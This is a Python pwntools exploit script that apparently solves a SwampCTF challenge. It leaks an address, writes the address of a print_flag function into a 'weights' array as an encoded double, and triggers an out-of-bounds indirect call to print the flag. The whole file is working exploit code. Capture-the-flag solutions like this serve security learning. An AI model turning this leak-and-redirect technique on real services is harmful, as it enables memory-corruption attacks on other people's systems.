from pwn import *
import struct

# Abuse a logical bug that results in an Out-Of-Bounds vulnerability when invoking `call_function` 
# This OOB vulnerability allows invoking a function, only by knowing it's address.
# It also requires us to have the address of the to-be-invoked function in the stack, and this is 
# possible by editing the weights. 
#
# [!] Note:
#       I also found a way to leak an address, but it turned out that ASLR is off, so I wasted my time on leaking
#       Even though I didn't have to :(


r = remote('chal1.swampctf.com',1122)

def menu():
	r.recvuntil('box')

def start_weights():
	menu()
	r.sendline('3')

def send_bias(bias):
	menu()
	r.sendline('4')
	for _ in xrange(0,4):
		r.sendline(str(bias))
		r.recvline()

def leak(bias):
	menu()
	r.sendline('4')
	result_leak = 0
	for _ in xrange(0,4):
		r.sendline(bias)
		r.recvuntil('new bias: ')
		leak = r.recvline()
		result_leak = leak
		r.recvrepeat(0.2)
	return result_leak


def send_weight_encode(weight):
	r.recvline()
	double_val = str(struct.unpack('>d',hex(weight)[2:].replace('L','').decode('hex').rjust(8,'\x00'))[0])
	r.sendline(double_val.replace('3e','284e')) # python is not precise enough
	r.recvline()

def send_weight(weight):
	r.sendline(str(weight))
	r.recvline()

def print_weights():
	menu()
	r.sendline('5')

def print_bias():
	menu()
	r.sendline('6')

def read_data(opt):
	menu()
	r.sendline('2')
	r.recvuntil('passwds')
	r.sendline(str(opt))
	dat = r.recvuntil('Enter')[:-5]
	return dat
	

send_bias('')
leaked = float(leak(''))
printflag_diff = 0xa659c8


log.info("Leaked address in the binary @ %s" % leaked)

int_leak = struct.unpack('<Q',struct.pack('<d',leaked))[0]

print_flag = int_leak + printflag_diff

log.info("print_flag @ 0x%x" % print_flag) # lol. no leak needed ;D..
print ""


r.sendline()
for i in xrange(0,10):
	r.sendline('')
	r.recvline()

r.sendline('')
start_weights()
send_weight_encode(print_flag)

log.info("Embedded print_flag's addres...")
print ""

for _ in xrange(0,11):
	send_weight(-3.3) # will get rax before "call rax" to the first weight

log.info("Finished filling weights")
print ""

send_bias(-3.3)

log.info("Sent biases..")
print ""

log.info("Showing weights && biases to change v3's value ...")
print ""

for _ in xrange(0,2):
	print_weights()
	print_bias()

log.info("Ready to get flag..")
print ""

flag = read_data(3)

print "The flag is: "+flag

r.interactive()
